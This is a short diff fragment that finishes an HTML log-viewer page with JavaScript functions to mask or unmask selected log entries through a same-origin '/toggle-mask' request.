+    async function bulkMask() { for (const id of selectedIds) { await fetch('/toggle-mask', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id }) }); const e = allLogs.find(x => x.id === id); if (e) e.masked = true; } render(); }
+    async function bulkUnmask() { for (const id of selectedIds) { await fetch('/toggle-mask', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id }) }); const e = allLogs.find(x => x.id === id); if (e) e.masked = false; } render(); }
+    loadLogs();
+  </script>
+</body>
+</html>
